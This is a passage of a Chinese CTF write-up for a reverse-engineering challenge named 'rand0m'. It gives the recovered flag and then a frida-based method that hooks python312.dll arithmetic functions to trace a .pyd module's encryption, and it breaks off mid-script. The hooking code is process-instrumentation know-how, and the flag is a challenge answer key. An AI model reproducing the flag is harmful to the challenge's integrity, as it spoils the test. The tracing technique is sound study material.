0xd4b34f74</span><br><span class="hljs-comment"># 0x802ba126</span><br><span class="hljs-comment"># 0x78950880</span><br><br></code></pre></td></tr></table></figure><p>flag 为:flag{813a97f3d4b34f74802ba12678950880}</p><h4 id="做法二：动调-frida"><a href="#做法二：动调-frida" class="headerlink" title="做法二：动调+frida"></a>做法二：动调+frida</h4><h5 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h5><p>用 frida hook（或者 ida 打条件断点）pyd 中的运算和比较相关的函数名来 trace，根据 trace 的结果再结合动调梳理出加密逻辑</p><p>由于 pyd 文件不能直接动调，这里采用 <strong>attch python 进程</strong>的方式</p><blockquote><p>可以在附件给的 challenge.py 中加上 <code>import sys</code> ，<code> print(sys.executable)</code>和<code>import os</code>,<code>print(os.getpid())</code>，以便查看运行该文件的 Python 解释器路径和 pid，然后运行 .py 文件之后去 ida，选择 Local Windows debugger 作调试器，在 Debugger -&gt; Attach to Process 中选择对应的 python 进程(| 刚刚解释器的路径下的 python.exe)进行调试<br>frida 的话可以运行 .py 文件后执行命令 frida-ps | findstr python 找到 pid</p></blockquote><p>先运行 题目给的 challenge.py 文件,得到 pid<br>然后运行 hook 脚本</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment"># hook_python.py</span><br><span class="hljs-keyword">import</span> frida<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;rand0m.js&quot;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    jscode = f.read()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">on_message</span>(<span class="hljs-params">message, data</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*]&quot;</span>, message)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">try</span>:<br>        device = frida.get_local_device()<br>    <br>        <span class="hljs-comment"># target = input(&quot;Enter PID or process name: &quot;).strip()</span><br>        target = <span class="hljs-number">35164</span><br>        <br>        <span class="hljs-keyword">try</span>:<br>            pid = <span class="hljs-built_in">int</span>(target)<br>            session = device.attach(pid)<br>        <span class="hljs-keyword">except</span> ValueError:<br>            session = device.attach(target)<br>        <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] Attached to <span class="hljs-subst">&#123;target&#125;</span>&quot;</span>)<br>        <br>        script = session.create_script(jscode)<br>        script.on(<span class="hljs-string">&#x27;message&#x27;</span>, on_message)<br>        script.load()<br>        <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Script loaded. Monitoring Python operations...&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Press Ctrl+C to stop and analyze.\n&quot;</span>)<br>        <br>        <br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                time.sleep(<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">except</span> KeyboardInterrupt:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[*] Stopping trace and analyzing...&quot;</span>)<br>            script.exports.stop()<br>            time.sleep(<span class="hljs-number">2</span>)  <br>        <br>    <span class="hljs-keyword">except</span> KeyboardInterrupt:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[*] Exiting...&quot;</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] Error: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h5 id="frida-hook-脚本-rand0m-js"><a href="#frida-hook-脚本-rand0m-js" class="headerlink" title="frida hook 脚本 rand0m.js"></a>frida hook 脚本 rand0m.js</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] Python Crypto Trace Script Started&quot;</span>);<br><br><span class="hljs-keyword">var</span> hook_list = [<br>    <span class="hljs-string">&quot;PyNumber_Add&quot;</span>, <span class="hljs-string">&quot;PyNumber_And&quot;</span>, <span class="hljs-string">&quot;PyNumber_Rshift&quot;</span>, <span class="hljs-string">&quot;PyNumber_Lshift&quot;</span>,<br>    <span class="hljs-string">&quot;PyNumber_Xor&quot;</span>, <span class="hljs-string">&quot;PyNumber_InPlaceRshift&quot;</span>, <span class="hljs-string">&quot;PyNumber_InPlaceAdd&quot;</span>,<br>    <span class="hljs-string">&quot;PyNumber_Multiply&quot;</span>, <span class="hljs-string">&quot;PyNumber_Power&quot;</span>, <span class="hljs-string">&quot;PyNumber_Index&quot;</span>,<br>    <span class="hljs-string">&quot;PyObject_RichCompare&quot;</span>, <span class="hljs-string">&quot;PyNumber_Remainder&quot;</span><br>];<br><br><span class="hljs-keyword">var</span> callSequence = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">var</span> traceData = [];<br><span class="hljs-keyword">var</span> isTracing = <span class="hljs-literal">true</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">findExportByName</span>(<span class="hljs-params">moduleName, exportName</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">Module</span>.<span class="hljs-property">findExportByName</span> === <span class="hljs-string">&#x27;function&#x27;</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(moduleName, exportName);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">Module</span>.<span class="hljs-property">getExportByName</span> === <span class="hljs-string">&#x27;function&#x27;</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">getExportByName</span>(moduleName, exportName);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">Module</span>.<span class="hljs-property">getGlobalExportByName</span> === <span class="hljs-string">&#x27;function&#x27;</span>) &#123;<br>        <span class="hljs-keyword">if</span> (moduleName === <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">getGlobalExportByName</span>(exportName);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">const</span> <span class="hljs-variable language_">module</span> = <span class="hljs-title class_">Process</span>.<span class="hljs-title function_">findModuleByName</span>(moduleName);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">module</span>) &#123;<br>                <span class="hljs-keyword">const</span> <span class="hljs-built_in">exports</span> = <span class="hljs-variable language_">module</span>.<span class="hljs-title function_">enumerateExports</span>();<br>                <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">exports</span>.<span class="hljs-property">length</span>; i++) &#123;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">exports</span>[i].<span class="hljs-property">name</span> === exportName) &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-built_in">exports</span>[i].<span class="hljs-property">address</span>;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">parsePyLong</span>(<span class="hljs-params">addr</span>) &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">if</span> (!addr || addr.<span class="hljs-title function_">isNull</span>()) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <br>        <span class="hljs-keyword">const</span> ob_size = addr.<span class="hljs-title function_">add</span>(<span class="hljs-number">0x10</span>).<span class="hljs-title function_">readS64</span>();<br>        <span class="hljs-keyword">if</span> (ob_size === <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        <br>        <span class="hljs-keyword">const</span> isNegative = ob_size &lt; <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">const</span> numdigits = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(<span class="hljs-title class_">Number</span>(ob_size));<br>        <br>        <span class="hljs-keyword">if</span> (numdigits &gt; <span class="hljs-number">0x1000</span>) &#123;<br>            <span class="hljs-keyword">const</span> digit = addr.<span class="hljs-title function_">add</span>(<span class="hljs-number">0x18</span>).<span class="hljs-title function_">readU32</span>();<br>            <span class="hljs-keyword">return</span> isNegative ? -digit : digit;<br>        &#125;<br>        <br>        <span class="hljs-keyword">if</span> (numdigits &gt; <span class="hljs-number">2</span>) &#123;<br>            <span class="hljs-keyword">let</span> bigVal = <span class="hljs-number">0n</span>;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; numdigits; i++) &#123;<br>                <span class="hljs-keyword">const</span> digit = addr.<span class="hljs-title function_">add</span>(<span class="hljs-number">0x18</span> + <span class="hljs-number">4</span> * i).<span class="hljs-title function_">readU32</span>();<br>                bigVal += <span class="hljs-title class_">BigInt</span>(digit) * (<span class="hljs-number">1n</span> &lt;&lt; (<span class="hljs-number">30n</span> * <span class="hljs-title class_">BigInt</span>(i)));<br>            &#125;<br>            <span class="hljs-keyword">return</span> isNegative ? -bigVal : bigVal;<br>        &#125;<br>        <br>        <span class="hljs-keyword">let</span> val = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; numdigits; i++) &#123;<br>            val += addr.<span class="hljs-title function_">add</span>(<span class="hljs-number">0x18</span> + <span class="hljs-number">4</span> * i).<span class="hljs-title function_">readU32</span>() * <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">pow</span>(<span class="hljs-number">2</span>, <span class="hljs-number">30</span> * i);<br>        &#125;<br>        <span class="hljs-keyword">return</span> isNegative ? -val : val;<br>        <br>    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">formatHex</span>(<span class="hljs-params">val, minWidth = <span class="hljs-number">8</span></span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> val === <span class="hljs-string">&#x27;bigint&#x27;</span>) &#123;<br>        <span class="hljs-keyword">return</span> val.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">toUpperCase</span>().<span class="hljs-title function_">padStart</span>(minWidth, <span class="hljs-string">&#x27;0&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> val.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">toUpperCase</span>().<span class="hljs-title function_">padStart</span>(minWidth, <span class="hljs-string">&#x27;0&#x27;</span>);<br>&#125;<br><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getOperationType</span>(<span class="hljs-params">op</span>) &#123;<br>    <span class="hljs-keyword">if</span> (op.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;Add&#x27;</span>) || op.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;Subtract&#x27;</span>) || op.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;Multiply&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;ARITHMETIC&#x27;</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (op.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;And&#x27;</span>) || op.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;Or&#x27;</span>) || op.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;Xor&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;BITWISE&#x27;</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (op.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;Rshift&#x27;</span>) || op.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;Lshift&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;SHIFT&#x27;</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (op.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;Power&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;POWER&#x27;</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (op.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;RichCompare&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;COMPARE&#x27;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;OTHER&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">logOperation</span>(<span class="hljs-params">seq, op, arg1, arg2, result</span>) &#123;<br>    <span class="hljs-keyword">const</span> type = <span class="hljs-title function_">getOperationType</span>(op);<br>    <span class="hljs-keyword">const</span> arg1Hex = <span class="hljs-title function_">formatHex</span>(arg1, <span class="hljs-number">16</span>);<br>    <span class="hljs-keyword">const</span> arg2Hex = <span class="hljs-title function_">formatHex</span>(arg2, <span class="hljs-number">16</span>);<br>    <span class="hljs-keyword">const</span> resultHex = <span class="hljs-title function_">formatHex</span>(result, <span class="hljs-number">16</span>);<br>    <br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`\n[<span class="hljs-subst">$&#123;seq.toString().padStart(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;0&#x27;</span>)&#125;</span>] <span class="hljs-subst">$&#123;type.padEnd(<span class="hljs-number">10</span>)&#125;</span> | <span class="hljs-subst">$&#123;op.padEnd(<span class="hljs-number">20</span>)&#125;</span>`</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`       INPUT:  0x<span class="hljs-subst">$&#123;arg1Hex&#125;</span>`</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`       PARAM:  0x<span class="hljs-subst">$&#123;arg2Hex&#125;</span>`</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`       OUTPUT: 0x<span class="hljs-subst">$&#123;resultHex&#125;</span>`</span>);<br>    <br><br>    traceData.<span class="hljs-title function_">push</span>(&#123;<br>        <span class="hljs-attr">sequence</span>: seq,<br>        <span class="hljs-attr">type</span>: type,<br>        <span class="hljs-attr">operation</span>: op,<br>        <span class="hljs-attr">arg1</span>: arg1,<br>        <span class="hljs-attr">arg2</span>: arg2,<br>        <span class="hljs-attr">result</span>: result,<br>        <span class="hljs-attr">timestamp</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>()<br>    &#125;);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">analyzeEncryptionFlow</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;\n&quot;</span> + <span class="hljs-string">&quot;=&quot;</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">50</span>));<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;           TRACE COMPLETED&quot;</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;=&quot;</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">50</span>));<br>    <br>    <br>    <span class="hljs-keyword">const</span> shiftOps = traceData.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">op</span> =&gt;</span> op.<span class="hljs-property">type</span> === <span class="hljs-string">&#x27;SHIFT&#x27;</span>);<br>    <br>    <span class="hljs-keyword">if</span> (shiftOps.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;\nSHIFT OPERATIONS:&quot;</span>);<br>        shiftOps.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">op</span> =&gt;</span> &#123;<br>            <span class="hljs-keyword">const</span> direction = op.<span class="hljs-property">operation</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;Lshift&#x27;</span>) ? <span class="hljs-string">&#x27;LEFT&#x27;</span> : <span class="hljs-string">&#x27;RIGHT&#x27;</span>;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`   [<span class="hljs-subst">$&#123;op.sequence&#125;</span>] <span class="hljs-subst">$&#123;direction.padEnd(<span class="hljs-number">5</span>)&#125;</span> shift by <span class="hljs-subst">$&#123;op.arg2&#125;</span> bits: 0x<span class="hljs-subst">$&#123;formatHex(op.arg1)&#125;</span> -&gt; 0x<span class="hljs-subst">$&#123;formatHex(op.result)&#125;</span>`</span>);<br>        &#125;);<br>    &#125;<br>    <br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;=&quot;</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">50</span>));<br>&#125;<br><br><span class="hljs-comment">// 主 Hook 逻辑</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">installHooks</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] Installing Python operation hooks...&quot;</span>);<br>    <br>    <span class="hljs-keyword">const</span> pythonModule = <span class="hljs-title class_">Process</span>.<span class="hljs-title function_">findModuleByName</span>(<span class="hljs-string">&#x27;python312.dll&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (!pythonModule) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Python312.dll module not found&#x27;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[*] Found Python module: <span class="hljs-subst">$&#123;pythonModule.name&#125;</span> at <span class="hljs-subst">$&#123;pythonModule.base&#125;</span>`</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[*] Starting trace...\n`</span>);<br>    <br>    <span class="hljs-keyword">let</span> successCount = <span class="hljs-number">0</span>;<br>    <br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; hook_list.<span class="hljs-property">length</span>; i++) &#123;<br>        <span class="hljs-keyword">const</span> op = hook_list[i];<br>        <br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">const</span> funcAddress = <span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&#x27;python312.dll&#x27;</span>, op);<br>            <br>            <span class="hljs-keyword">if</span> (!funcAddress || funcAddress.<span class="hljs-title function_">isNull</span>()) &#123;<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">`[WARN] Function not found: <span class="hljs-subst">$&#123;op&#125;</span>`</span>);<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <br>            <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(funcAddress, &#123;<br>                <span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">args</span>) &#123;<br>                    <span class="hljs-keyword">if</span> (!isTracing) <span class="hljs-keyword">return</span>;<br>                    <br>                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">op</span> = op;<br>                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">sequence</span> = ++callSequence;<br>                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">timestamp</span> = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();<br>                    <br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-variable language_">this</span>.<span class="hljs-property">arg1</span> = <span class="hljs-title function_">parsePyLong</span>(args[<span class="hljs-number">0</span>]);<br>                        <span class="hljs-variable language_">this</span>.<span class="hljs-property">arg2</span> = <span class="hljs-title function_">parsePyLong</span>(args[<span class="hljs-number">1</span>]);<br>                    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>                        <span class="hljs-variable language_">this</span>.<span class="hljs-property">arg1</span> = <span class="hljs-number">0</span>;<br>                        <span class="hljs-variable language_">this</span>.<span class="hljs-property">arg2</span> = <span class="hljs-number">0</span>;<br>                    &#125;<br>                &#125;,<br>                <br>                <span class="hljs-attr">onLeave</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">retval</span>) &#123;<br>                    <span class="hljs-keyword">if</span> (!isTracing) <span class="hljs-keyword">return</span>;<br>                    <br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-keyword">const</span> result = <span class="hljs-title function_">parsePyLong</span>(retval);<br>                        <span class="hljs-title function_">logOperation</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">sequence</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">op</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">arg1</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">arg2</span>, result);<br>                    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>                        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[<span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.sequence&#125;</span>] <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.op&#125;</span> completed with error: <span class="hljs-subst">$&#123;e.message&#125;</span>`</span>);<br>                    &#125;<br>                &#125;<br>            &#125;);<br>            <br>            successCount++;<br>            <br>        &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`Failed to hook <span class="hljs-subst">$&#123;op&#125;</span>: <span class="hljs-subst">$&#123;e.message&#125;</span>`</span>);<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[*] Successfully hooked <span class="hljs-subst">$&#123;successCount&#125;</span>/<span class="hljs-subst">$&#123;hook_list.length&#125;</span> functions\n`</span>);<br>&#125;<br><br><br>rpc.<span class="hljs-property">exports</span> = &#123;<br>    <span class="hljs-attr">stop</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        isTracing = <span class="hljs-literal">false</span>;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;\n[*] Tracing stopped. Analyzing...&quot;</span>);<br>        <span class="hljs-title function_">analyzeEncryptionFlow</span>();<br>    &#125;<br>&#125;;<br><br><span class="hljs-title class_">SetTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-title 